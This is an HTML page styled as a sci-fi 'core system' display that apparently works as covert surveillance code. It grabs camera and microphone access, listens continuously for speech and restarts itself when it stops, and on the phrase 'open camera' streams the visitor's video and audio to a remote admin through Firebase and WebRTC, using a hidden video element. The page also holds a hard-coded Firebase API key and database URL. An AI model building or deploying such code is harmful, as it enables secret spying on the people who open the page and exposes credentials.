<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Binno Core System</title>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
    <style>
        body { background-color: #000; color: #0ff; font-family: 'Courier New', monospace; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        
        /* Sci-Fi Circle Animation */
        .core { position: relative; width: 200px; height: 200px; display: flex; align-items: center; justify-content: center; }
        .ring { position: absolute; width: 100%; height: 100%; border: 2px solid transparent; border-top: 2px solid #0ff; border-bottom: 2px solid #0ff; border-radius: 50%; animation: spin 4s linear infinite; box-shadow: 0 0 15px #0ff; }
        .ring:nth-child(2) { width: 80%; height: 80%; border: 2px solid transparent; border-left: 2px solid #0055ff; border-right: 2px solid #0055ff; animation: spin-rev 3s linear infinite; box-shadow: 0 0 10px #0055ff; }
        .center-dot { width: 10px; height: 10px; background: red; border-radius: 50%; box-shadow: 0 0 20px red; transition: 0.3s; }
        
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes spin-rev { 0% { transform: rotate(360deg); } 100% { transform: rotate(0deg); } }

        /* Text Info */
        .info { margin-top: 30px; text-align: center; z-index: 10; }
        .id-badge { font-size: 20px; font-weight: bold; border: 1px solid #0ff; padding: 5px 15px; border-radius: 5px; background: rgba(0, 255, 255, 0.1); }
        .status { font-size: 12px; margin-top: 5px; color: #888; }
        
        /* Hidden Video for Stream */
        video { display: none; } 
    </style>
</head>
<body>

    <div class="core">
        <div class="ring"></div>
        <div class="ring"></div>
        <div class="center-dot" id="dot"></div>
    </div>

    <div class="info">
        <div class="id-badge" id="userId">CONNECTING...</div>
        <div class="status" id="msg">SYSTEM INITIALIZING</div>
    </div>
    
    <video id="localVideo" autoplay playsinline muted></video>

    <script>
        // ⚠️ আপনার Firebase Config এখানে বসান
        const firebaseConfig = {
            apiKey: "AIzaSyCjkTs-41gSVeQQgDKWE6fSWvj1POgHHpc", // আপনার API Key দিন
            authDomain: "ollo-ff1f3.firebaseapp.com",
            databaseURL: "https://ollo-ff1f3-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "ollo-ff1f3"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // 1. Unique ID Generation (e.g., ID-AB12)
        const userId = "ID-" + Math.random().toString(36).substr(2, 4).toUpperCase();
        document.getElementById('userId').innerText = userId;

        // Register User to Database
        db.ref(`users/${userId}`).set({
            isActive: true,
            lastSeen: Date.now()
        });
        
        // Disconnect handle
        db.ref(`users/${userId}`).onDisconnect().remove();

        let pc;
        const config = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };
        let stream = null;

        // 2. Permission & Background Logic
        async function initSystem() {
            try {
                // Background Mode: Ask for permission immediately
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('msg').innerText = "SYSTEM ONLINE - LISTENING";
                document.getElementById('dot').style.background = "#0ff";
                document.getElementById('dot').style.boxShadow = "0 0 20px #0ff";
                
                startVoiceListener();
                listenForAdmin();
                
            } catch (err) {
                document.getElementById('msg').innerText = "ACCESS DENIED";
            }
        }

        // 3. Admin Control Listener
        function listenForAdmin() {
            db.ref(`users/${userId}/isActive`).on('value', snapshot => {
                const active = snapshot.val();
                if (active === false) {
                    // Admin blocked this user
                    if (pc) pc.close();
                    document.getElementById('msg').innerText = "BLOCKED BY ADMIN";
                    document.getElementById('dot').style.background = "red";
                    window.location.reload(); // Reset connection
                }
            });
        }

        // 4. Voice Command (Always Listening)
        function startVoiceListener() {
            const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
            if (!SpeechRecognition) return;

            const recognition = new SpeechRecognition();
            recognition.continuous = true;
            recognition.lang = 'en-US';

            recognition.onresult = (event) => {
                const cmd = event.results[event.results.length - 1][0].transcript.toLowerCase();
                
                if (cmd.includes("open camera")) {
                    startStreaming();
                    document.getElementById('msg').innerText = "UPLOADING FEED...";
                }
            };
            
            // Auto restart if stops (Background Keep-Alive)
            recognition.onend = () => recognition.start();
            recognition.start();
        }

        // 5. WebRTC Streaming
        async function startStreaming() {
            if (!stream) return;
            
            pc = new RTCPeerConnection(config);
            stream.getTracks().forEach(track => pc.addTrack(track, stream));

            pc.onicecandidate = event => {
                if (event.candidate) {
                    db.ref(`calls/${userId}/candidates`).push(event.candidate.toJSON());
                }
            };

            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
            
            // Send Offer to Firebase
            db.ref(`calls/${userId}/offer`).set({
                sdp: offer.sdp,
                type: offer.type
            });

            // Listen for Answer
            db.ref(`calls/${userId}/answer`).on('value', async snapshot => {
                const answer = snapshot.val();
                if (answer && !pc.currentRemoteDescription) {
                    await pc.setRemoteDescription(new RTCSessionDescription(answer));
                }
            });
        }

        initSystem();
    </script>
</body>
</html>
